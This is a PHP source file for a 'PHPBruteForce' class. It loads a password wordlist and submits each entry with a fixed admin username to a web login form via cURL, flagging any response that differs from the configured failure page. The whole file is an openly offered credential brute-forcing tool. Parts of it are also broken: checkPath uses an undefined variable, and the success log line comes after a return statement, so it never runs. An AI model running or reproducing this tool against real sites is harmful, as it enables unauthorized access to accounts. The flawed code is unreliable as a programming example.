<?php

/*
* PHPBruteForce Class
*
* @author ItsMeSam
* @website https://github.com/itsmesam
* @license MIT License
*/

class BruteForce 
{
	/*
	* @param {array} settings 
	*/
	protected static $settings = array();

	/*
	* @param {string} curl
	*/ 
	protected $curl;

	/*
	* @param {array} data
	*/
	protected static $data = array();

	/*
	* @param {boolean} validate
	*/
	protected static $validate = false;

	/*
	* @param {boolean} checked
	*/
	protected static $checked = false;



	/*
	* @param {array} settings
	*/
	public static function init(array $settings)
	{
		self::$settings = $settings;
	}


	protected function scanFile() 
	{
		if ( !file_exists( self::$settings['wordlist'] ) )
		{
			trigger_error( 'File doesn\'t exist' );
		} 
		else
		{
			$file = fopen( self::$settings['wordlist'], 'r');
			$file = fread( $file, filesize( self::$settings['wordlist'] ) );
			$file = str_replace( " ", "", $file);
			$file = str_replace( "\r", "", $file);
			return preg_split( "(\n)", $file );
		}
		
	}	


	

	/*
	* @param {string} data
	*/
	protected function logAttack($data)
	{
		if ( !file_exists(self::$settings['outputfile'] ) )
		{
			trigger_error('Output file doesn\'t exist ');
		}

		date_default_timezone_set(self::$settings['timezone']);
		$date = date('m/d/Y h:i:s a', time());

		file_put_contents(self::$settings['outputfile'],"[{$date}] Server: " .  $data . "\n", FILE_APPEND);
	}

	public function checkPath($path)
	{
		if( $this->checkURL($url) )
		{
			$headers = @get_headers($path);

			if($headers[0] == 'HTTP/1.1 404 Not Found')
			{
				self::$checked = true;
				self::$validate = false;
				return false;
			}
			else
			{
				self::$checked = true;
				self::$validate = true;
				return true;
			}
		}
		else
		{
			self::$checked = true;
			self::$validate = false;
			return false;
		}

	}

	public function checkURL($url, $mode = true)
	{
		if( !filter_var( $url, FILTER_VALIDATE_URL ) )
		{
			if ($mode)
			{
				$this->logAttack('Failed to filter ' . $url . ' as a valid URL.');
			}

			self::$checked = true;
			self::$validate = false;
			return false;
		}

		$this->curl = curl_init( $url );
		curl_setopt( $this->curl, CURLOPT_CONNECTTIMEOUT, 10 );
		curl_setopt( $this->curl, CURLOPT_NOBODY, true );
		curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true );

		$resp = curl_exec( $this->curl );

		if($resp)
		{
			return true;
		}
		else
		{
			if($mode)
			{
				$this->logAttack($url . ' is not a valid URL, can\'t connect.');
			}
			self::$checked = true;
			self::$validate = false;
			return false;
		}


	}

	public function attack()
	{
		if(self::$validate === false && self::$checked === false)
		{
			if ( !$this->checkURL(self::$settings['url']) )
			{
				return "Something isn't validate. Check your output file.";
				return false;
			}
		} 
		elseif(self::$validate === false && self::$checked === true)
		{
			return "Something isn't validate. Check your output file.";
			return false;
		}

		foreach( $this->scanFile() as $l => $f)
		{
			self::$data[self::$settings['username']] = self::$settings['adminname'];
			self::$data[self::$settings['password']] = $f;

			$this->curl = curl_init( self::$settings['url'] );
			curl_setopt( $this->curl, CURLOPT_POST, true );
			curl_setopt( $this->curl, CURLOPT_POSTFIELDS, http_build_query( self::$data ) );
			curl_setopt( $this->curl, CURLOPT_RETURNTRANSFER, true);


			if (curl_exec( $this->curl ) != self::$settings['failcontent'])
			{
				return "Found a combo. Check the output log.";
				$this->logAttack('Found a matching combination (' . self::$settings['adminname'] . ':' . $f .') in line ' . $l . ' of ' . self::$settings['wordlist'] );
			} 
			
		}	
		curl_close($this->curl);
		
	}

}